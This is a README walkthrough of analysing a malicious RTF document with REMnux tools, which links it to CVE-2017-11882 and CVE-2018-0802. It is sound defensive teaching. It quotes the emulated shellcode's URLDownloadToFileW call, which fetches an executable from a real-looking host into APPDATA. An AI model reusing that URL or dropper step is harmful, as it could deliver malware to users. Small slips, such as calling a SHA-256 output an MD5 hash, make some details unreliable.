# Malware-analysis-REMnux

<hr>
<h3>Overview</h3>
This document provides a detailed walkthrough of the process for analyzing a real malware file using REMnux, a Linux distribution focused on assisting malware analysts with reverse-engineering tasks. The document, a demonstration of MyDFIR, guides the reader through steps such as downloading the malware file, extracting its contents, examining its metadata, and utilizing various tools available in REMnux to dissect the file further. Each step is explained with clarity, providing valuable insights into the analysis process. By following this document, analysts can gain a deeper understanding of malware analysis techniques and enhance their proficiency in identifying and mitigating security threats.
<hr>

<h4>Cloud Tools and Evnironment</h4>
VirtualBox, REMnux

<h4>Source material</h4>
https://www.letsdefend.io/

https://remnux.org/

<h4>References</h4>
GCK file signature-https://www.garykessler.net/library/file_sigs.html
<br>
ShellCode-https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf
<br>
NDV-https://nvd.nist.gov/
<br>
Redhat-https://www.redhat.com/en/topics/security/what-is-cve
<br>
GetProcAddress-https://malapi.io/winapi/GetProcAddress
<br>
VirusTotal-https://www.virustotal.com/gui/home/upload

<h2>Project walk-through</h2>
<hr>
Important: This file contains real malware. Download at your own risk.

We are going to use REMnux to analyze this malware. You can obtain the file from Let's Defend website, then click "learn". Look up "malicious doc", then you will find an icon with Frankenstein. Click that and download it onto your VM. For example, run REMnux on VirtualBox and download it from there.

<img src="images/1.png" width="550">
<img src="images/2.png" width="550">
<br>
Once it's downloaded, go to the command prompt and type "ls". This will show the directories within. Then type "cd Downloads/", then "ls". Here you will find the malicious file name Factural.zip.

<img src="images/3.png" width="550">
<br>
Type "unzip fractura.zip". A small nice tip that many people knows but for people who don't know: you can type "fr" then press "tab" on the keyboard. It will automatically fill the rest. 

Password: infected. You can find the password on the website you downloaded.

<br>
Then type "ls" again then you will find "factura.doc".

<img src="images/4.png" width="550">
<br>
To generate a file hash, type "sha256sum factura.doc" in your terminal. This will provide you with an MD5 hash that can be used for searching on services like VirusTotal, among others.

<img src="images/5.png" width="550">
<br>
Let's see how long this file is by typing "ls -lh".

<img src="images/6.png" width="550">
<br>
Type "exiftool factura.doc" to see other information about it. We can see the file size, modification date and time, and file type. We now know that it's RTF type.

<img src="images/7.png" width="550">
<br>
Let's type RTF then hit "tab". This will show us some tools that exist in REMnux.
<br>
Now you see 2 tools: rtfdump.py and rtfobj.
<img src="images/8.png" width="550">
<br>
You can find more helpful commands by typing "rtfdump.py -h" and again for "rtfobj -h".

<img src="images/9.png" width="550">
<br>
Let's try rtfdump.py by typing "rtfdump.py factura.doc". We can see something but I do not know what is going on.

But we can see that 1,2, and 3 is bigger than 4 and 5.

<img src="images/10.png" width="550">
<br>
This time, let's try "rtfdump.py -s 2 factura.doc". Then, we receive a bunch of information that we can't read.

But they are in hexadecimal format.

<img src="images/11.png" width="550">
<br>
Let's try to see if we can find any help from "-h". Type "rtfdump.py -h". 

We saw some hexadecimal. So using "-H" might be helpful to learn more about this file.

<img src="images/12.png" width="550">
<br>
Let's type "rtfdump.py -H -s 2 factura.doc". Little bit of change but not much we can distinguish.

<img src="images/13.png" width="550">
<br>
How about 3rd one? Try "rtfdump.py. -H -s 3 factura.doc", same here as well.

<img src="images/14.png" width="550">
<br>
Try the 1st one, "rtfdump.py -H -s 1 factura.doc", and we see something. "Root Entry" and "Equation Native", interesting.

<img src="images/15.png" width="550">
<br>
4 and 5 are not much either as we can see.

<img src="images/16.png" width="550">
<br>
Let's try "rtfobj factura.doc". We can see the MD5 hash and related CVE. CVE is short for Common Vulnerabilities and Exposures, it's a list of publicly disclosed computer security flaws. Source CVE-2017-11882 and CVE-2018-0802, you can look these up on NVD for more details such as summary and severity scores.

<img src="images/17.png" width="550">
<br>
Let's get some help from "rtfobj -h". We can see that extraction is possible by "-s all" or "-s 2".

<img src="images/18.png" width="550">
<br>
Let's try "rtfobj -s all factura.doc". Now we can see that it has been saved to a file name file factura.doc_object_00000CB6.bin".

 We can check it by using "ls".

<img src="images/19.png" width="550">
<br>
Type "file factura.doc_object_00000CB6.bin". It says "Composite Document File V2 Document".

<img src="images/20.png" width="550">
<br>
Type "xxd factura.doc_object_00000CB6.bin". We see another "Root Entry" and "Equation Native".

Also, if you look at the first line you will find "d0 cf ll e0".

<img src="images/21.png" width="550">
<img src="images/22.png" width="550">
<br>
We can look up this file entry on Gary Kessler's File Signatures. Here we can look up "d0 cf ll e0". Now we know what kind of file this is, we can dissect it further.

<img src="images/23.png" width="550">
<br>
Type "ole" and hit "tab". Now can see the tools we can use. Let's use "oledump.py -h", to get more information.

<img src="images/24.png" width="550">
<br>
Type "oledump.py factura.doc_object_00000CB6.bin" and we get 'Equation Native' in return.

<img src="images/25.png" width="550">
<br>
Try "oledump.py -s 1 factura.doc_object_00000CB6.bin", and we get a bunch of stuff that we cannot read. But this gives us an idea that we might be dealing with shellcode. Shellcode is defined as a set of instructions injected and then executed by an exploited program. Source-https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf

<img src="images/26.png" width="550">
<br>
Type "scdbg", it's a tool in REMnux for shellcode. Soon after you type that, a window will pop up and we will say "No". It's asking if you want to add this to shell extension. It will ask if it's your first time using the tool, just like me. :)
<img src="images/27.png" width="550">
<br>
Then another window will come up. Click on "..." first to find our file.
<img src="images/28.png" width="550">
<br>
Then click the one that we want which is "factura.doc_object_00000CB6.bin", then press "Open".
<img src="images/29.png" width="550">
<br>
Then check these 2 boxes "Create Dump" and "FinSc", then click "Launch".
<img src="images/30.png" width="550">
<br>
In the background, it has found 7 entries with "GetProcAddress".
<img src="images/31.png" width="550">
<br>
GetProcAddress is used to get the memory address of a function in a DLL. 
<br>This is often used by malware for obfuscation and evasion purposes to avoid having to call the function directly. Source-https://malapi.io/winapi/GetProcAddress 
<br>
In another word, it's an instruction on what to do next.

<br>
Let's look at the 1st one by typing "0" then hit enter. It looks like "Select index to execute:: (int/reg) 0".
<img src="images/32.png" width="550">
We can see some information here. "(%APPDATA%\aro.exe)" "URLDownloadToFileW(http:seed-bc.com/juop4/plwr/mklo/rbn/jan2.exe, C:\users\remnux\Application Data\aro.exe)" Which means download "aro.exe" executable file from "http:seed-bc.com" to "C:\users\remnux\Application Data". It's a very sneaky move.


<h2>Conclusion</h2>
In conclusion, this document serves as a comprehensive guide for malware analysis using REMnux, offering valuable insights into the intricate process of dissecting and understanding malicious files. By following the steps outlined in this document, analysts can enhance their skills in identifying, analyzing, and mitigating security threats effectively. The use of REMnux tools and techniques demonstrates the power of open-source resources in the field of cybersecurity, empowering analysts to stay ahead of evolving threats and protect systems against malicious activity. As the cybersecurity landscape continues to evolve, the knowledge and techniques gained from this document will be invaluable for analysts in safeguarding digital assets and networks against sophisticated attacks.
